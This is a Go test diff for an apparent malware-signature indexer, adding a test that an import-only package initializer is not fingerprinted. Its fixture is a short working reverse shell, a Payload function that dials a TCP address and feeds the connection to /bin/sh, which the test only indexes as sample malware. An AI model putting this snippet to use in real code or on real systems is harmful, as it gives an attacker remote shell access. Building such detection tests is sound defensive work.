@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"io/fs"
 	"os"
+	"path/filepath"
 	"slices"
 	"sort"
 	"strings"
@@ -411,5 +412,64 @@ func TestFileSizeGuard(t *testing.T) {
 	expected := fmt.Sprintf("file exceeds maximum analysis size of %d bytes", MaxSourceFileSize)
 	if output.ErrorMessage != expected {
 		t.Errorf("Expected error %q, got %q", expected, output.ErrorMessage)
+	}
+}
+
+// TestRunIndex_SkipsImportOnlyInit verifies that a package initializer which
+// only runs its imports' initializers is not indexed (its signature would
+// match any package with the same imports), while one that does real work is.
+func TestRunIndex_SkipsImportOnlyInit(t *testing.T) {
+	dir := t.TempDir()
+	index := func(src string) []string {
+		path := filepath.Join(dir, "sample.go")
+		if err := os.WriteFile(path, []byte(src), 0o644); err != nil {
+			t.Fatal(err)
+		}
+		results, err := LoadAndFingerprint(RealFileSystem{}, path)
+		if err != nil {
+			t.Fatalf("LoadAndFingerprint: %v", err)
+		}
+		sigs, _, err := RunIndexJSON(path, results, "S", "HIGH", "malware", filepath.Join(t.TempDir(), "db.json"))
+		if err != nil {
+			t.Fatalf("RunIndexJSON: %v", err)
+		}
+		var names []string
+		for _, s := range sigs {
+			names = append(names, s.Name)
+		}
+		return names
+	}
+
+	names := index(`package sample
+
+import (
+	"net"
+	"os/exec"
+)
+
+func Payload(addr string) {
+	c, _ := net.Dial("tcp", addr)
+	cmd := exec.Command("/bin/sh")
+	cmd.Stdin = c
+	cmd.Run()
+}
+`)
+	if slices.Contains(names, "S_init") {
+		t.Errorf("import-only init was indexed: %v", names)
+	}
+	if !slices.Contains(names, "S_Payload") {
+		t.Errorf("payload function not indexed: %v", names)
+	}
+
+	names = index(`package sample
+
+import "os"
+
+var home = os.Getenv("HOME")
+
+func Use() string { return home }
+`)
+	if !slices.Contains(names, "S_init") {
+		t.Errorf("init with a package-level initializer was skipped: %v", names)
 	}
 }
